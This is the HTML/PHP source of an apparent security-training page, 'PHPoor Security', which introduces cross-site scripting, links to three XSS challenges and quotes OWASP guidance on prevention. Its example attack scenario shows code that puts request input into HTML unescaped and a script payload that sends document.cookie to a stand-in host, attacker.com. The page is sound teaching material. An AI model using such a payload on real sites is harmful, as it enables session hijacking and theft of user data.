<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>PHPoor Security</title>
<style type="text/css">
.content {
	padding: 10px 0;
	width: 78%;
	float: right;
	margin-right: 1%;
	background-color: rgba(0,0,255,.2);
	border-radius: 5px;
}
</style>
<link href="_CSS/aboutStyleSheet.css" rel="stylesheet" type="text/css">
<link href="SpryAssets/SpryMenuBarHorizontal.css" rel="stylesheet" type="text/css">
<link href="SpryAssets/SpryMenuBarVertical.css" rel="stylesheet" type="text/css">
<!--[if lte IE 7]>
<style>
.content { margin-right: -1px; } /* this 1px negative margin can be placed on any of the columns in this layout with the same corrective effect. */
ul.nav a { zoom: 1; }  /* the zoom property gives IE the hasLayout trigger it needs to correct extra whiltespace between the links */
</style>
<![endif]-->
<script src="SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<meta name="keywords" content="XSS, Cross Site Scripting, PHPoor Security">
<meta name="description" content="Cross Site Scripting XSS">
</head>

<body>

<div class="container">
  <div class="header"><img src="_images/Logo.png" width="900" height="160" alt="Logo"> 
  <?php include("_includes/header.php"); ?>
  <!-- end .header --></div>
  <div class="sidebar1">
    
    <ul id="MenuBar2" class="MenuBarVertical">
<li><a href="cross_site_scripting/challenge_1.php">Challenge 1</a></li>
    <li><a href="cross_site_scripting/challenge_2.php">Challenge 2</a></li>
    <li><a href="cross_site_scripting/challenge_3.php">Challenge 3</a></li>
<li><a href="preventing_XSS.php">Preventing XSS</a></li>
  </ul>
  <p>Information on OWASP and the OWASP top ten project can be found <a href="https://www.owasp.org/index.php/Main_Page">here</a></p>
  <!-- end .sidebar --></div>
    <h1>Cross Site Scripting</h1>
  <div class="content">
    <p>XSS (Cross Site Scripting) flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>
    <p>&nbsp;</p>
    <p>To the right are three challenges designed to test an understanding of how Cross Site Scripting can be used to access and modify data. After the challenges have been completed, the code modifications necessary to stop these attacks will be shown.</p>
    <p>&nbsp;</p>
    <p>The information below is taken directly from the OWASP Top Ten Project which can be found <a href="https://www.owasp.org/index.php/Main_Page">here</a>.</p>
    <p>&nbsp;</p>
    <h2>Am I Vulnerable To XSS?</h2>
    <p>You are vulnerable if you do not ensure that all user supplied input is properly escaped, or you do not verify it to be safe via input validation, before including that input in the output page. Without proper output escaping or validation, such input will be treated as active content in the browser. If Ajax is being used to dynamically update the page, are you using safe JavaScript APIs? For unsafe JavaScript APIs, encoding or validation must also be used.</p>
    <p>&nbsp;</p>
    <p> Automated tools can find some XSS problems automatically. However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, making automated detection difficult. Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches. </p>
    <p>&nbsp;</p>
    <p>Web 2.0 technologies, such as Ajax, make XSS much more difficult to detect via automated tools.</p>
    <p>&nbsp;</p>
    <h2>How Do I Prevent XSS?</h2>
    <p>Preventing XSS requires separation of untrusted data from active browser content.</p>
    <p><br>
    1. The preferred option is to properly escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into. See the OWASP XSS Prevention Cheat Sheet for details on the required data escaping techniques.</p>
    <p><br>
    2. Positive or “whitelist” input validation is also recommended as it helps protect against XSS, but is not a complete defense as many applications require special characters in their input. Such validation should, as much as possible, validate the length, characters, format, and business rules on that data before accepting the input.</p>
    <p><br>
    3. For rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.</p>
    <p><br>
      4. Consider Content Security Policy (CSP) to defend against XSS across your entire site.</p>
    <p>&nbsp;</p>
    <h2>Example Attack Scenario</h2>
    <p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
    <p>&nbsp;</p>
    <p> <em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(String) page += &quot;&lt;input name='creditcard' type='TEXT‘ value='&quot; + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;; </em></p>
    <p>&nbsp;</p>
    <p>The attacker modifies the ‘CC’ parameter in his browser to:</p>
    <p>&nbsp;</p>
    <p> <em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'&gt;&lt;script&gt;document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi?<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foo='+document.cookie&lt;/script&gt;'</em>.</p>
    <p>&nbsp;</p>
    <p> This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ.</p>
    <p>&nbsp;</p>
    <!-- end .content --></div>
    <div id="body"><!-- body div for footer --></div>
  <div class="footer">
    <p>PHPoor Security</p>
    <!-- end .footer --></div>
  <!-- end .container --></div>
<script type="text/javascript">
<?php include("_includes/menuBar1.php"); ?>
var MenuBar2 = new Spry.Widget.MenuBar("MenuBar2", {imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>
